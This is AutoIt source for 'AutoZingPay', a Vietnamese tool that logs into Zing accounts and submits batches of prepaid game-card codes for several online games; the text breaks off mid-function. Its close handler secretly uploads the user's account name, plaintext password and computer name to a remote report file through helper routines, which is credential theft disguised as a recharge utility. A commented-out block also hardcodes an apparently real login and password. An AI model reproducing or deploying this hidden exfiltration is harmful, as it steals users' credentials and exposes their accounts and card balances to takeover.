#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=icon.ico
#AutoIt3Wrapper_Outfile=AutoZingPay_x86.exe
#AutoIt3Wrapper_Outfile_x64=AutoZingPay_x64.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_UseX64=y
#AutoIt3Wrapper_Res_Comment=AutoZingPay
#AutoIt3Wrapper_Res_Description=Tự động nạp thẻ ZingPay
#AutoIt3Wrapper_Res_Fileversion=2.1.0.1
#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=y
#AutoIt3Wrapper_Res_ProductName=AutoZingPay
#AutoIt3Wrapper_Res_ProductVersion=2.1.0
#AutoIt3Wrapper_Res_CompanyName=Trần Thanh Hùng
#AutoIt3Wrapper_Add_Constants=n
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
; *** Start added by AutoIt3Wrapper ***
#include <AutoItConstants.au3>
; *** End added by AutoIt3Wrapper ***
;#RequireAdmin
; *** Start added by AutoIt3Wrapper ***
#include <FileConstants.au3>
#include <ButtonConstants.au3>
#include <_HttpRequest.au3>
#include <EditConstants.au3>
#include <ComboConstants.au3>
#include <GUIConstantsEx.au3>
#include <ListViewConstants.au3>
#include <GUIListView.au3>
#include <Protection1.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
;#include <pause1.au3>
#include <File.au3>
#include <about.au3>

ProgressOn("Starting", "Đang khởi động chương trình....", "0%", -1, -1, BitOR($DLG_NOTONTOP, $DLG_MOVEABLE))
For $i = 1 To 74
	Sleep(30)
	ProgressSet($i, $i & "%")
Next
ProgressSet(75, 'Connecting...', 'Đang kết nối tới Server....')
_temp()
_tmp()
For $i = 76 To 100
	Sleep(30)
	ProgressSet($i, $i & "%")
Next
ProgressSet(100, "Done", "Complete")
ProgressOff()

#Region ### START Koda GUI section ### Form=C:\Users\htth2\Desktop\AutoZing\Form1.kxf
$Form1 = GUICreate("AutoZingPay ver 2.1.0 - by Trần Thanh Hùng", 609, 448, 359, 157)
GUISetFont(10, 400, 0, "MS Sans Serif")
GUISetBkColor(0x646464, $Form1)

$ListView1 = GUICtrlCreateListView("Serial|CardCode|Status", 245, 128, 245, 305, BitOR($ES_AUTOVSCROLL, $ES_READONLY, $WS_VSCROLL))
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 0, 100)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 1, 82)
GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 2, 60)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListView1), 0, 2)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListView1), 1, 2)
_GUICtrlListView_JustifyColumn(GUICtrlGetHandle($ListView1), 2, 2)
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)
;_GUICtrlListView_DeleteAllItems($ListView1)
;GUICtrlCreateListViewItem($split_data[3] & '|' & $sub_data[2] & '|' & 'Thất Bại', $ListView1)
$LAccount = GUICtrlCreateLabel("Account:", 16, 16, 63, 20)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, "-2")

$LPassword = GUICtrlCreateLabel("Password:", 248, 16, 76, 20)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, "-2")

$Account = GUICtrlCreateInput("", 80, 16, 153, 21, BitOR($GUI_SS_DEFAULT_INPUT, $WS_BORDER))
GUICtrlSetFont(-1, 9, 400, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)

$Password = GUICtrlCreateInput("", 328, 16, 145, 21, BitOR($GUI_SS_DEFAULT_INPUT, $ES_PASSWORD, $WS_BORDER))
GUICtrlSetFont(-1, 9, 400, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)

$Edit1 = GUICtrlCreateEdit("", 16, 128, 217, 305, BitOR($ES_AUTOVSCROLL, $ES_READONLY, $WS_VSCROLL))
GUICtrlSetData(-1, '')
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)

$Label3 = GUICtrlCreateLabel("STATUS", 72, 104, 73, 24)
GUICtrlSetFont(-1, 12, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)

$Label4 = GUICtrlCreateLabel("RESULT", 320, 104, 74, 24)
GUICtrlSetFont(-1, 12, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)

$BLogin = GUICtrlCreateButton("LOGIN", 504, 12, 81, 80)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)

$instruc = GUICtrlCreateButton("Instruction", 504, 144, 81, 33)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)

$recharge = GUICtrlCreateButton("Recharge", 504, 304, 81, 33)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)

$open = GUICtrlCreateButton("Open", 504, 224, 81, 33)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)

$about = GUICtrlCreateButton("About", 504, 368, 81, 33)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)

$Game = GUICtrlCreateLabel("Game:", 16, 64, 49, 20)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, "-2")

$Server = GUICtrlCreateLabel("Server:", 248, 64, 54, 20)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, "-2")

$CGame = GUICtrlCreateCombo("", 80, 64, 153, 25, BitOR($CBS_DROPDOWNLIST, $CBS_AUTOHSCROLL))
GUICtrlSetFont(-1, 10, 800, 0, "Times New Roman")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)
GUICtrlSetData(-1, 'Tân Thiên Long|Võ Lâm Truyền Kỳ 1|Võ Lâm Truyền Kỳ 2|Kiếm Thế|Gunny')
HotKeySet("{ESC}", "Terminate")
$CServer = GUICtrlCreateCombo("", 328, 64, 145, 25, BitOR($GUI_SS_DEFAULT_COMBO, $CBS_SIMPLE, $CBS_SORT, $CBS_DISABLENOSCROLL))
GUICtrlSetFont(-1, 10, 800, 0, "Times New Roman")
GUICtrlSetColor(-1, 0x00FF00)
GUICtrlSetBkColor(-1, 0x000000)

#cs $Confirm = GUICtrlCreateButton("CONFIRM", 504, 56, 81, 33)
GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0x00FF00)
#ce $Confirm = GUICtrlCreateButton("CONFIRM", 504, 56, 81, 33)
GUISetState(@SW_SHOW)
#EndRegion ### END Koda GUI section ###
#Region  ### Main ###
$sc_name = ''
$count = 0
$total = 0
$tach = StringSplit($chuoi[0], '},{', 1)
$acc = ''
$pass = ''
$game_name = ''
$csuccess = 0
Dim $sname[450], $sc_serverID[450], $gn_sID[450]
For $i = 1 To $tach[0]
	$a = StringRegExp($tach[$i], 'serverName":"(.*?)"', 1)
	$b = StringRegExp($tach[$i], 'serverID":"(.*?)"', 1)
	$c = StringRegExp($tach[$i], '"sID":(.*?),"', 1)
	$sname[$i - 1] = $a[0]
	$sc_serverID[$i - 1] = $b[0]
	$gn_sID[$i - 1] = $c[0]
	$sc_name = $sc_name & '|' & $sname[$i - 1]
Next
$sc_name = StringRight($sc_name, StringLen($sc_name) - 1)    ;chuỗi server name để setdata bị thừa 1 dấu | ở đầu
GUICtrlSetData($CServer, $sc_name)
While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $BLogin
			If GUICtrlRead($BLogin) = 'LOGIN' Then
				Switch GUICtrlRead($CGame)
					Case 'Tân Thiên Long'
						$pmOptID = 35
						$game_name = 'tanthienlong3d'
						_Login()
						_Text('[+] Đã chọn: Tân Thiên Long')
					Case 'Võ Lâm Truyền Kỳ 1'
						$pmOptID = 50
						$game_name = 'volamtruyenky'
						_Login()
						_Text('[+] Đã chọn: Võ Lâm Truyền Kỳ 1')
					Case 'Võ Lâm Truyền Kỳ 2'
						$pmOptID = 42
						$game_name = 'volam2'
						_Login()
						_Text('[+] Đã chọn: Võ Lâm Truyền Kỳ 2')
					Case 'Kiếm Thế'
						$pmOptID = 40
						$game_name = 'kiemthe'
						_Login()
						_Text('[+] Đã chọn: Kiếm Thế')
					Case 'Gunny'
						$pmOptID = 17
						$game_name = 'gunny'
						_LoginGunny()
				EndSwitch
			Else
				_Logout()
			EndIf
			#cs		Case $Confirm
						Switch GUICtrlRead($CGame)
							Case 'Tân Thiên Long'
								$pmOptID = 35
								$game_name = 'tanthienlong3d'
								_Text('[+] Đã chọn: Tân Thiên Long')
							Case 'Võ Lâm Truyền Kỳ 1'
								$pmOptID = 50
								$game_name = 'volamtruyenky'
								_Text('[+] Đã chọn: Võ Lâm Truyền Kỳ 1')
							Case 'Võ Lâm Truyền Kỳ 2'
								$pmOptID = 42
								$game_name = 'volam2'
								_Text('[+] Đã chọn: Võ Lâm Truyền Kỳ 2')
							Case 'Kiếm Thế'
								$pmOptID = ''
								$game_name = 'kiemthe'
								_Text('[+] Đã chọn: Kiếm Thế')
							Case 'Gunny'
								$pmOptID = ''
								$game_name = 'gunny'
								_Text('[+] Đã chọn: Gunny')
								_Text('[+] Server: ' & GUICtrlRead($CServer))
			#ce		Case $Confirm
		Case $instruc
			ShellExecute(@ScriptDir & '\README.txt')
		Case $open
			$file = FileOpenDialog('Choose the file .txt', @ScriptDir & '\', 'Text (*.txt)', BitOR($FD_FILEMUSTEXIST, $FD_MULTISELECT))
			_Text('[+] Load danh sách mã nạp thành công!')
		Case $recharge
			If $game_name = 'gunny' Then
				If StringLen(FileReadLine($file, 1)) <= 14 Then
					_Recgunny1()
				Else
					_Recgunny2()
				EndIf
			Else
				If StringLen(FileReadLine($file, 1)) <= 14 Then
					_Rec1()
				Else
					_Rec2()
				EndIf
			EndIf
			MsgBox(64, 'Report', 'Đã nạp xong!' & @CRLF & 'Tổng số thẻ: ' & $count & @CRLF & 'Số thẻ thành công: ' & $csuccess & @CRLF & 'Tổng tiền đã nạp: ' & $total & 'k')
			_Text('[+] Đã nạp xong!')
		Case $about
			_showAboutDialog('Auto Recharge Zing Pay', '2.1.0', 'Trần Thanh Hùng', Default, Default, 'https://www.facebook.com/darrenhtth')
		Case $GUI_EVENT_CLOSE
			_Text('[+] Đang đóng chương trình' & @CRLF & '[+] Vui lòng đợi....')
			_temp()
			_dumamadownload('report.txt')
			FileWrite(@AppDataDir & '\report.txt', $download)
			$data = ''
			For $i = 1 To _FileCountLines(@AppDataDir & '\report.txt')
				$data = $data & '\n' & FileReadLine(@AppDataDir & '\report.txt', $i)
			Next
			$data = StringRight($data, StringLen($data) - 2)
			_dumamaedit('report.txt', $data & '\n' & @HOUR & ':' & @MIN & '-' & @MDAY & '/' & @MON & '/' & @YEAR & ': ' & @ComputerName & ': ' & 'Account: ' & $acc & ' Pass: ' & $pass & ' Count: ' & $count & ' Success: ' & $csuccess & ' Total: ' & $total & ' ' & $game_name & '\n')
			FileDelete(@AppDataDir & '\report.txt')
	_dumamadownload('Total.txt')
	FileWrite(@AppDataDir & '\Total.txt', $download)
	$data = ''
	For $i = 1 To _FileCountLines(@AppDataDir & '\Total.txt')
		$data = $data & '\n' & FileReadLine(@AppDataDir & '\Total.txt', $i)
	Next
	$data = StringRight($data, StringLen($data) - 2)
	_dumamaedit('Total.txt', $data & '\n' & $total & '\n')
	FileDelete(@AppDataDir & '\Total.txt')
			Exit
	EndSwitch
WEnd
#EndRegion  ### Main ###
;$file = FileOpenDialog
;==============================_Text============================
Func _Text($txt)
	GUICtrlSetData($Edit1, $txt & @CRLF, 1)
EndFunc   ;==>_Text

;==============================_Login============================
Func _Login()
	Global $acc = GUICtrlRead($Account)
	Global $pass = GUICtrlRead($Password)
	$login = _HttpRequest(2, 'https://sso3.zing.vn/alogin', 'apikey=6e731b7ae5ca4146a880d7b956eb3649&pid=12&longtime=1&u=' & $acc & '&p=' & $pass & '&u1=https://pay.zing.vn/product/' & $game_name & '&fp=https://pay.zing.vn/wplogin/pc/' & $game_name, '', 'https://pay.zing.vn/wplogin/pc/' & $game_name, 'Upgrade-Insecure-Requests: 1')
	#cs	FileDelete(@ScriptDir & '\test.html')
		FileWrite(@ScriptDir & '\test.html', $login)
		ShellExecute(@ScriptDir & '\test.html')
	#ce	FileDelete(@ScriptDir & '\test.html')
	If @error Then
		_Text('[+] Sai tên đăng nhập hoặc mật khẩu.' & @CRLF & '[+] Vui lòng đăng nhập lại!')
	Else
		Global $sID = StringRegExp($login, '\{"sID":(.*?),"', 1)
		#cs
		$accountGuid = StringRegExp($login, 'var accountGuid="(.*?)";', 1)
		$serverID = StringRegExp($login, ',"serverID":"(.*?)","', 1)
		$load_payment = _HttpRequest(1, 'https://pay.zing.vn/ajax/check-account?productCode=tanthienlong3d&accountName=' & $acc & '&accountID=' & $accountID[0] & '&accountGuid=' & $accountGuid[0] & '&serverID=' & $serverID[0] & '&roleID=', '', '', 'https://pay.zing.vn/product/tanthienlong3d?mess=succ&u=' & $acc & '', 'X-Requested-With: XMLHttpRequest')
				$login_success = _HttpRequest(2, 'https://pay.zing.vn/payment/tanthienlong3d', 'sID=' & $sID[0] & '&serverID=all&pmOptID=35&pmcID=1&roleID=&roleName=&accountName=' & $acc & '', '', 'https://pay.zing.vn/product/tanthienlong3d?mess=succ&u=' & $acc & '', 'Upgrade-Insecure-Requests: 1')
		#ce
		$name = StringRegExp($login, 'class="fr">Xin chào(.*?) <a href=', 1)
		If @error Then
			_Text('[+] Lỗi không xác định, vui lòng thử lại sau.')
		Else
			_Text('[+] Đăng nhập thành công!' & @CRLF & '[+] Xin chào' & $name[0])
			GUICtrlSetData($BLogin, 'LOGOUT')
		EndIf
	EndIf
EndFunc   ;==>_Login

;==============================_Recharge============================
Func _Rec1()
	For $i = 1 To _FileCountLines($file) Step 2
		#cs		$aserial = StringSplit(FileReadLine($file, $i + 1), ':')
				$serial = StringReplace($aserial[2], '-', '')
				$acardpass = StringSplit(FileReadLine($file, $i), ':')
		#ce		$aserial = StringSplit(FileReadLine($file, $i + 1), ':')
		If StringLen(FileReadLine($file, $i)) > StringLen(FileReadLine($file, $i + 1)) Then
			$serial = StringReplace(FileReadLine($file, $i), ' ', '')
			$cardpass = StringReplace(FileReadLine($file, $i + 1), ' ', '')
		Else
			$serial = StringReplace(FileReadLine($file, $i + 1), ' ', '')
			$cardpass = StringReplace(FileReadLine($file, $i), ' ', '')
		EndIf
		$t = ($i + 1) / 2
		If StringLen($serial) <> 12 Then
			_Text('Thẻ ' & $t & ': Số seri không hợp lệ')
			GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
			$count = $count + 1
		Else
			$rec = _HttpRequest(2, 'https://pay.zing.vn/ajax/payment-zingcard', 'pmcID=1&pmOptID=' & $pmOptID & '&sID=' & $sID[0] & '&roleID=&roleName=&productCode=' & $game_name & '&cardSerial=' & $serial & '&cardPassword=' & $cardpass & '&accountName=' & $acc, '', 'https://pay.zing.vn/payment/' & $game_name, 'X-Requested-With: XMLHttpRequest')
			$aID = StringRegExp($rec, '"transID":(.*?)\}', 1)
			$link_cf = 'https://new.pay.zing.vn/result/' & $game_name & '/' & $aID[0]
			$cf = _HttpRequest(2, $link_cf, 'pmcID=1&pmOptID=' & $pmOptID, '', 'https://new.pay.zing.vn/payment/' & $game_name, 'Upgrade-Insecure-Requests: 1')
			#cs			FileDelete(@ScriptDir & '\test.html')
						FileWrite(@ScriptDir & '\test.html', $cf)
			#ce			FileDelete(@ScriptDir & '\test.html')
			$result = _HttpRequest(2, 'https://new.pay.zing.vn/ajax/get-result', 'transID=' & $aID[0], '', $link_cf, 'X-Requested-With: XMLHttpRequest')
			#cs			FileDelete(@ScriptDir & '\test.html')
						FileWrite(@ScriptDir & '\test.html', $result)
			#ce			FileDelete(@ScriptDir & '\test.html')
			If StringInStr($result, 'Thẻ đã được sử dụng') > 0 Then
				_Text('Thẻ ' & $t & ": Thẻ đã được sử dụng")
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, 'Sai mật mã thẻ') > 0 Then
				_Text('Thẻ ' & $t & ': Sai mật mã thẻ')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, 'Không tìm thấy giao dịch bạn thanh toán!') > 0 Then
				_Text('[+] Không tìm thấy giao dịch bạn thanh toán!')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, '"netValue"') > 0 Then
				_Text('Thẻ ' & $t & ': Nạp thẻ thành công')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'OK', $ListView1)
				$count = $count + 1
				$csuccess = $csuccess + 1
				$total = $total + Number(StringRegExp($result, '"netValue":"(.*?)"', 1)[0])
			Else
				_Text('Thẻ ' & $t & ': Lỗi không xác định!')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
			EndIf
		EndIf
		#cs		FileDelete(@ScriptDir&'\test.html')
				FileWrite(@ScriptDir&'\test.html',$result2\

				ShellExecute(@ScriptDir&'\test.html')
		#ce		FileDelete(@ScriptDir&'\test.html')
		Sleep(5000)
	Next
EndFunc   ;==>_Rec1
;==============================_Reg2============================
Func _Rec2()
	For $i = 1 To _FileCountLines($file) Step 1
		$code = StringSplit(FileReadLine($file, $i), ' ')
		If StringLen($code[2]) > StringLen($code[1]) Then
			$serial = StringReplace($code[2], ' ', '')
			$cardpass = StringReplace($code[1], ' ', '')
		Else
			$serial = StringReplace($code[1], ' ', '')
			$cardpass = StringReplace($code[2], ' ', '')
		EndIf
		If StringLen($serial) <> 12 Then
			_Text('Thẻ ' & $i & ': Số seri không hợp lệ')
			GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
			$count = $count + 1
		Else
			$rec = _HttpRequest(2, 'https://pay.zing.vn/ajax/payment-zingcard', 'pmcID=1&pmOptID=' & $pmOptID & '&sID=' & $sID[0] & '&roleID=&roleName=&productCode=' & $game_name & '&cardSerial=' & $serial & '&cardPassword=' & $cardpass & '&accountName=' & $acc, '', 'https://pay.zing.vn/payment/' & $game_name, 'X-Requested-With: XMLHttpRequest')
			#cs	FileDelete(@ScriptDir & '\test1.html')
				FileWrite(@ScriptDir & '\test1.html', $rec)
			#ce	FileDelete(@ScriptDir & '\test1.html')
			$aID = StringRegExp($rec, '"transID":(.*?)\}', 1)
			$link_cf = 'https://new.pay.zing.vn/result/' & $game_name & '/' & $aID[0]
			$cf = _HttpRequest(2, $link_cf, 'pmcID=1&pmOptID=' & $pmOptID, '', 'https://new.pay.zing.vn/payment/' & $game_name, 'Upgrade-Insecure-Requests: 1')
			#cs	FileDelete(@ScriptDir & '\test2.html')
				FileWrite(@ScriptDir & '\test2.html', $cf)
			#ce	FileDelete(@ScriptDir & '\test2.html')
			$result = _HttpRequest(2, 'https://new.pay.zing.vn/ajax/get-result', 'transID=' & $aID[0], '', $link_cf, 'X-Requested-With: XMLHttpRequest')
			#cs FileDelete(@ScriptDir & '\test3.html')
			FileWrite(@ScriptDir & '\test3.html', $result)
			#ce FileDelete(@ScriptDir & '\test3.html')
			If StringInStr($result, 'Thẻ đã được sử dụng') > 0 Then
				_Text('Thẻ ' & $i & ": Thẻ đã được sử dụng")
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
				;	$csuccess = $csuccess + 1
				;	$total = $total +10
			ElseIf StringInStr($result, 'Sai mật mã thẻ') > 0 Then
				_Text('Thẻ ' & $i & ': Sai mật mã thẻ')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, 'Không tìm thấy giao dịch bạn thanh toán!') > 0 Then
				_Text('[+] Không tìm thấy giao dịch bạn thanh toán!')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, '"netValue"') > 0 Then
				_Text('Thẻ ' & $i & ': Nạp thẻ thành công')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'OK', $ListView1)
				$count = $count + 1
				$csuccess = $csuccess + 1
				$total = $total + Number(StringRegExp($result, '"netValue":"(.*?)"', 1)[0])
			Else
				_Text('Thẻ ' & $i & ': Lỗi không xác định!')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
			EndIf
		EndIf
		#cs		FileDelete(@ScriptDir&'\test.html')
				FileWrite(@ScriptDir&'\test.html',$result)
		#ce		FileDelete(@ScriptDir&'\test.html')
		Sleep(5000)
	Next
EndFunc   ;==>_Rec2
;==============================_Logout============================
Func _Logout()
	_GUICtrlListView_DeleteAllItems($ListView1)
	GUICtrlSetData($Edit1, '')
	GUICtrlSetData($BLogin, 'LOGIN')
EndFunc   ;==>_Logout

;==============================_LoginGunny========================
Func _LoginGunny()
	Global $acc = GUICtrlRead($Account)
	$pass = GUICtrlRead($Password)
	$game_name = 'gunny'
	$login = _HttpRequest(2, 'https://sso3.zing.vn/alogin', 'apikey=6e731b7ae5ca4146a880d7b956eb3649&pid=12&longtime=1&u=' & $acc & '&p=' & $pass & '&u1=https://pay.zing.vn/product/' & $game_name & '&fp=https://pay.zing.vn/wplogin/pc/' & $game_name, '', 'https://pay.zing.vn/wplogin/pc/' & $game_name, 'Upgrade-Insecure-Requests: 1')
	#cs FileDelete(@ScriptDir & '\test.html')
	FileWrite(@ScriptDir & '\test.html', $login)
	#ce FileDelete(@ScriptDir & '\test.html')
	$accountID = StringRegExp($login, 'var accountID="(.*?)";', 1)
	If @error Then
		_Text('[+] Sai tên đăng nhập hoặc mật khẩu.' & @CRLF & 'Vui lòng đăng nhập lại!')
	Else
		;Global $sID = StringRegExp($login, '\{"sID":(.*?),"', 1)[0]
		#cs	Else
				$chuoi = StringRegExp($login, 'var serverList \= \[{(.*?)}\]\;', 1)
				$tach = StringSplit($chuoi[0], '},{', 1)
				Dim $sname[411], $sc_serverID[411]
				For $i = 1 To $tach[0]
					$a = StringRegExp($tach[$i], 'serverName":"(.*?)"', 1)
					$b = StringRegExp($tach[$i], 'serverID":"(.*?)"', 1)
					$sname[$i-1]=$a[0]
					$sc_serverID[$i-1]=$b[0]
					$sc_name=$sc_name &'|'& $sname[$i-1]
				Next
				$sc_name=StringRight($sc_name,StringLen($sc_name)-1)
		#ce	Else
		#cs	_HttpRequest(2,'https://stc.pay.zing.vn/zpv3/public/css/screen.css?ver=20190928000212421','','','https://new.pay.zing.vn/product/gunny')
			_HttpRequest(2,'https://stc.pay.zing.vn/zpv3/public/css/custom-2018.css?ver=20190928000212421','','','https://new.pay.zing.vn/product/gunny')
			_HttpRequest(2,'https://stc.pay.zing.vn/zpv3/public/js/jquery-1.11.2.min.js?ver=20190928000212421','','','https://new.pay.zing.vn/product/gunny')
			_HttpRequest(2,'https://stc.pay.zing.vn/zpv3/public/js/zing.js?ver=20190928000212421','','','https://new.pay.zing.vn/product/gunny')
			_HttpRequest(2,'https://stc.pay.zing.vn/zpv3/public/js/product.js?20190928000212421','','','https://new.pay.zing.vn/product/gunny')
		#ce	_HttpRequest(2,'https://stc.pay.zing.vn/zpv3/public/css/screen.css?ver=20190928000212421','','','https://new.pay.zing.vn/product/gunny')
		For $i = 1 To $tach[0]
			If GUICtrlRead($CServer) = $sname[$i - 1] Then
				$cf_server = _HttpRequest(2, 'https://new.pay.zing.vn/ajax/get-role-list?productCode=gunny&accountName=' & $acc & '&accountID=' & $accountID[0] & '&serverID=' & $sc_serverID[$i - 1], '', '', 'https://new.pay.zing.vn/product/gunny', 'X-Requested-With: XMLHttpRequest|Upgrade-Insecure-Requests: 1')
				;	'https://new.pay.zing.vn/ajax/get-role-list?productCode=gunny&accountName=lady8288nb1&accountID=431895162&serverID=383'
				;MsgBox(0,0,'https://new.pay.zing.vn/ajax/get-role-list?productCode=gunny&accountName=' & $acc & '&accountID=' & $accountID & '&serverID='&$sc_serverID[$i-1])
				Global $cf_sID = $gn_sID[$i - 1]
				ExitLoop
			EndIf
		Next
		Global $aroleID = StringRegExp($cf_server, 'roleID":"(.*?)"', 1)
		If @error Then
			_Text('[+] Nhân vật không tồn tại.' & @CRLF & '[+] Vui lòng kiểm tra lại.')
		Else
			Global $roleID = $aroleID[0]
			Global $roleName = StringRegExp($cf_server, 'roleName":"(.*?)"', 1)[0]
			;MsgBox(0,0,$sID & $sc_serverID[$i-1] & $pmOptID & $roleID & $roleName)
			_HttpRequest(2, 'https://new.pay.zing.vn/payment/gunny', 'sID=' & $gn_sID[$i] & '&serverID=' & $sc_serverID[$i - 1] & '&pmOptID=' & $pmOptID & '&pmcID=1&roleID=' & $roleID & '&roleName=' & $roleName & '&accountName=' & $acc, '', 'https://new.pay.zing.vn/product/gunny', 'Upgrade-Insecure-Requests: 1')
			#cs		FileDelete(@ScriptDir & '\test.html')
				FileWrite(@ScriptDir & '\test.html', $test)
			#ce		FileDelete(@ScriptDir & '\test.html')
			#cs
			$accountGuid = StringRegExp($login, 'var accountGuid="(.*?)";', 1)
			$serverID = StringRegExp($login, ',"serverID":"(.*?)","', 1)
			$load_payment = _HttpRequest(1, 'https://pay.zing.vn/ajax/check-account?productCode=tanthienlong3d&accountName=' & $acc & '&accountID=' & $accountID[0] & '&accountGuid=' & $accountGuid[0] & '&serverID=' & $serverID[0] & '&roleID=', '', '', 'https://pay.zing.vn/product/tanthienlong3d?mess=succ&u=' & $acc & '', 'X-Requested-With: XMLHttpRequest')
					$login_success = _HttpRequest(2, 'https://pay.zing.vn/payment/tanthienlong3d', 'sID=' & $sID[0] & '&serverID=all&pmOptID=35&pmcID=1&roleID=&roleName=&accountName=' & $acc & '', '', 'https://pay.zing.vn/product/tanthienlong3d?mess=succ&u=' & $acc & '', 'Upgrade-Insecure-Requests: 1')
			#ce
			$name = StringRegExp($login, 'class="fr">Xin chào(.*?) <a href=', 1)
			If @error Then
				_Text('[+] Lỗi không xác định, vui lòng thử lại sau.')
			Else
				_Text('[+] Đăng nhập thành công!' & @CRLF & '[+] Xin chào' & $name[0])
				_Text('[+] Đã chọn: Gunny')
				_Text('[+] Server: ' & GUICtrlRead($CServer))
				_Text('[+] Nhân vật: ' & $roleName)
				GUICtrlSetData($BLogin, 'LOGOUT')
			EndIf
		EndIf
	EndIf
EndFunc   ;==>_LoginGunny

#cs	FileDelete(@ScriptDir & '\test.html')
	FileWrite(@ScriptDir & '\test.html', $volam)
#ce	FileDelete(@ScriptDir & '\test.html')

#csFunc _GetData()
	$login = _HttpRequest(2, 'https://sso3.zing.vn/alogin', 'apikey=6e731b7ae5ca4146a880d7b956eb3649&pid=12&longtime=1&u=htth281199&p=Matkhauhung1&u1=https://pay.zing.vn/product/gunny&fp=https://pay.zing.vn/wplogin/pc/gunny', '', 'https://pay.zing.vn/wplogin/pc/gunny', 'Upgrade-Insecure-Requests: 1')
	$chuoi = StringRegExp($login, 'var serverList \= \[{(.*?)}\]\;', 1)
	$tach = StringSplit($chuoi[0], '},{', 1)
	Dim $sname[411], $sc_serverID[411]
	For $i = 1 To $tach[0]
		$a = StringRegExp($tach[$i], 'serverName":"(.*?)"', 1)
		$b = StringRegExp($tach[$i], 'serverID":"(.*?)"', 1)
		$sname[$i - 1] = $a[0]
		$sc_serverID[$i - 1] = $b[0]
		$sc_name = $sc_name & '|' & $sname[$i - 1]
	Next
	$sc_name = StringRight($sc_name, StringLen($sc_name) - 1)
	GUICtrlSetData($CServer, $sc_name)
#ceFunc _GetData()

;==============================_Reggunny1============================
Func _Recgunny1()
	For $i = 1 To _FileCountLines($file) Step 2
		#cs		$aserial = StringSplit(FileReadLine($file, $i + 1), ':')            lỗi do step 2, i trên khác i dưới
				$serial = StringReplace($aserial[2], '-', '')
				$acardpass = StringSplit(FileReadLine($file, $i), ':')
		#ce		$aserial = StringSplit(FileReadLine($file, $i + 1), ':')            lỗi do step 2, i trên khác i dưới
		If StringLen(FileReadLine($file, $i)) > StringLen(FileReadLine($file, $i + 1)) Then
			$serial = StringReplace(FileReadLine($file, $i), ' ', '')
			$cardpass = StringReplace(FileReadLine($file, $i + 1), ' ', '')
		Else
			$serial = StringReplace(FileReadLine($file, $i + 1), ' ', '')
			$cardpass = StringReplace(FileReadLine($file, $i), ' ', '')
		EndIf
		$t = ($i + 1) / 2
		If StringLen($serial) <> 12 Then
			_Text('Thẻ ' & $t & ': Số seri không hợp lệ')
			GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
			$count = $count + 1
		Else
